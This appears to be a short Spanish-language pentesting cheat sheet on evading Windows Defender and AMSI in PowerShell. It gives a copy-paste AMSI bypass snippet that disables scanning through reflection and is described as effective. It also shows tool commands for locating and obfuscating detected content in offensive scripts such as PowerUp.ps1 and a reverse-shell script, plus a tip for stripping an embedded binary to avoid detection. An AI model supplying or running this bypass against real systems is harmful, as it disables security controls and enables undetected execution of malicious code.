## Bypassing PowerShell Security 

Tags: #AD #Bypass #AD #AMSI 

## Bypassing AV Signatures for Powershell 

* [AMSITrigger](https://github.com/RythmStick/AMSITrigger)
* [DefenderCheck](https://github.com/t3hbb/DefenderCheck)
* [Full - Ofuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

```bash 
1. Siempre se puede cargar scripts en memoria y evitar la detección usando AMSI bypass
2. Usar AMSITrigger o DefenderCheck para identificar código y strings desde un binario o script que Windows Defender podría marcar como sospechoso (malicioso)
3. Invoke-Ofuscation es usado para tener una ofuscación total del script en Powershell 
```

```Powershell 
# Copiar y pegar en powershell para evadir el AMSI (Efectiva). Esto solo funciona al cargar en memoria los binarios ".PS1"

$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$me = $field.GetValue($field)
$me = $field.SetValue($null, [Boolean]"hhfff")
```

## DefenderCheck 

```bash  
# Analizar un archivo/script para identificar qué contenido puede estar provocando una detección por Windows Defender

❯ .\DefenderCheck.exe PowerUp.ps1

NOTA:
	1. Si quieres ofuscar el 'PowerUp.ps1' ir a la linea '2640' y eliminar el contenido de la variable '$B64Binary = ""'
```

```bash 
# Analizar un PowerShell script en busca de contenido que pueda ser detectado por AMSI

❯ .\AmsiTrigger_x64.exe -i C:\AD\Invoke-PowershellTcp.ps1   
```